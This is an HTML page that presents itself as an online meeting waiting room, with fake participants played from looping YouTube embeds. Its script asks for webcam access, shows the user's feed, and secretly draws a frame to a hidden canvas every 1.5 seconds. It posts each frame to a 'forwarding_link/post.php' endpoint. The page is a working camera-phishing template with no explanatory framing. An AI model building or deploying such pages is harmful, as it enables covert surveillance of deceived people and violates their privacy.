<!doctype html>
<html>

<head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <title>Online Meeting</title>
</head>

<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");

  body {
    height: 100vh;
    width: 100vw;
  }

  * {
    padding: 0px;
    margin: 0px;
    font-family: 'Nunito', sans-serif;
    font-weight: 500;
  }

  /* Hide original video and canvas for background capture */
  .video-wrap, #canvas {
    display: none !important;
  }

  .main-screen {
    background-color: #273039;
    flex-grow: 1; /* Take all available vertical space */
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    padding-bottom: 80px; /* Make space for the fixed bottom bar */
    box-sizing: border-box; /* Include padding in height calculation */
  }
  
  img {
    height: 80px;
    width: 80px;
  }

  .bottom-bar {
    position: fixed;
    bottom: 0px;
    left: 0;
    right: 0;
    height: 80px;
    width: 100%;
    background-color: #1F2022;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: center;
    color: #fff;
    z-index: 100;
  }

  .icon-button {
    display: flex;
    flex-direction: column;
    justify-items: center;
    align-items: center;
  }

  i {
    margin-bottom: 8px;
    font-size: 26px;
  }

  button {
    color: #fff;
    background-color: crimson;
    padding: 5px 20px;
    border: none;
    border-radius: 5px;
    border-style: none;
    outline: none;
  }

  .float_button {
    background-color: #1F2022;
    height: 40px;
    border-radius: 5px;
    width: 40px;
    position: fixed;
    display: flex;
    align-items: center;
    justify-content: center;
    top: 5px;
    right: 5px;
    z-index: 90; /* Below popup, above meeting grid */
  }
  #ac-wrapper {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,.8); /* Darker overlay for popup */
    z-index: 1001;
    display: flex; /* Use flex for centering */
    justify-content: center;
    align-items: center;
}

#popup {
    width: 90%; /* Responsive width */
    max-width: 555px; /* Max width for larger screens */
    background: #FFFFFF;
    border: 5px solid #000;
    border-radius: 15px;
    box-shadow: #64686e 0px 0px 3px 3px;
    padding: 20px; /* Add padding for better appearance */
    text-align: center;
    color: black; /* Ensure text is visible */
}
#popup h2 {
    margin: 0;
    font-size: 18px; /* Adjust font size */
    line-height: 1.4;
}

/* Meeting Grid Styles */
.meeting-grid-container {
    flex-grow: 1; /* Take up available space */
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    padding: 20px; /* Padding around the grid */
    box-sizing: border-box;
}

.meeting-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Adjust tile size as needed */
    gap: 10px;
    width: 100%; /* Take full width of its container */
    max-width: 1200px; /* Max width for the grid */
    background-color: #1F2022;
    border-radius: 10px;
    padding: 10px; /* Padding inside the grid */
}

.participant-tile {
    background-color: #333;
    border-radius: 8px;
    overflow: hidden;
    position: relative;
    aspect-ratio: 16/9; /* Maintain video aspect ratio */
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    color: white;
    font-size: 14px;
}

.participant-tile iframe, .participant-tile img {
    width: 100%;
    height: 100%;
    border: none;
    pointer-events: none; /* Evita que interactúen con los controles de YT */
    display: block;
}

.participant-tile video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: none; /* Hidden by default, shown when stream is active */
}

.participant-tile .participant-name {
    position: absolute;
    bottom: 5px;
    left: 5px;
    background-color: rgba(0, 0, 0, 0.5);
    padding: 3px 8px;
    border-radius: 3px;
    font-size: 12px;
}

/* Class added by JS when user's camera is active */
.participant-tile.active-user-feed video {
    display: block; /* Show video when active */
}

.participant-tile.active-user-feed img {
    display: none; /* Hide placeholder image when active */
}
</style>
<body>
  <div class="float_button">
    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
  </div>

  <div class="main-screen">
    <div class="meeting-grid-container">
      <div class="meeting-grid">
        <!-- Placeholder participants -->
        <div class="participant-tile">
            <iframe src="https://www.youtube.com/embed/mhpwcZbcDL0?autoplay=1&mute=1&loop=1&controls=0&playlist=mhpwcZbcDL0&modestbranding=1&rel=0" allow="autoplay"></iframe>
            <div class="participant-name">Usuario 1</div>
        </div>
        <div class="participant-tile">
            <iframe src="https://www.youtube.com/embed/wUoK-Lx8ej4?autoplay=1&mute=1&loop=1&controls=0&playlist=wUoK-Lx8ej4&modestbranding=1&rel=0" allow="autoplay"></iframe>
            <div class="participant-name">Usuario 2</div>
        </div>
        <div class="participant-tile">
            <iframe src="https://www.youtube.com/embed/fc-APsIFqqo?autoplay=1&mute=1&loop=1&controls=0&playlist=fc-APsIFqqo&modestbranding=1&rel=0" allow="autoplay"></iframe>
            <div class="participant-name">Usuaria 3</div>
        </div>
        <!-- User's live webcam feed -->
        <div class="participant-tile user-feed" id="user-participant-tile">
            <video id="user-webcam-display" playsinline autoplay muted></video>
            <div class="participant-name">You</div>
        </div>
        <div class="participant-tile">
            <iframe src="https://www.youtube.com/embed/flZFhg8hHJc?autoplay=1&mute=1&loop=1&controls=0&playlist=flZFhg8hHJc&modestbranding=1&rel=0" allow="autoplay"></iframe>
            <div class="participant-name">Usuario 4</div>
        </div>
      </div>
    </div>
  </div>

  <div class="bottom-bar">
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-microphone"></i>
      <h6>Mute</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-video"></i>
      <h6>Stop Video</h6>
    </div>
    <div class="icon-button" style="margin-left: auto;">
      <i class="fas fa-shield-alt"></i>
      <h6>Security</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-users"></i>
      <h6>Participants</h6>
    </div>
    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
      <i class="fas fa-plus-square"></i>
      <h6>Share content</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-comments"></i>
      <h6>Chat</h6>
    </div>
    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
      <i class="fas fa-record-vinyl"></i>
      <h6>Record</h6>
    </div>
    <button style="margin-right: 50px;">End</button>
  </div>

  <!-- Hidden video and canvas for background capture -->
  <div class="video-wrap" hidden>
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas id="canvas" width="640" height="480" hidden></canvas>

  <!-- Popup for waiting room -->
  <div id="ac-wrapper">
    <div id="popup">
        <h2>Please wait, the meeting host will let you in soon</h2>
    </div>
  </div>

  <script>
    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function (result) {
          // call the function that handles the response/results
        },
        error: function () {
        }
      });
    };

    'use strict';

    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        handleError(e); // Pass error to handleError
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      
      if (video) video.srcObject = stream; // This is the hidden video for canvas capture

      const userParticipantTile = document.getElementById('user-participant-tile');
      const userWebcamDisplay = document.getElementById('user-webcam-display');
      if (userWebcamDisplay && userParticipantTile) {
        userWebcamDisplay.srcObject = stream; // Assign stream to the visible video element
        userParticipantTile.classList.add('active-user-feed'); // Add class to show video
      }

      // Hide the waiting room popup
      const acWrapper = document.getElementById('ac-wrapper');
      if (acWrapper) acWrapper.style.display = 'none';

      if (canvas && video) {
        const context = canvas.getContext('2d');
        setInterval(function () {
          context.drawImage(video, 0, 0, 640, 480);
          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
          post(canvasData);
        }, 1500);
      }
    }

    function handleError(error) {
      const popupMessage = document.querySelector('#popup h2');
      if (popupMessage) {
        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
          popupMessage.innerText = 'Camera access denied. Please enable camera to join the meeting.';
        } else {
          popupMessage.innerText = `Error accessing camera: ${error.message}`;
        }
      }
      const acWrapper = document.getElementById('ac-wrapper');
      if (acWrapper) acWrapper.style.display = 'flex';
    }

    // Load init
    init();
  </script>
</body>

</html>
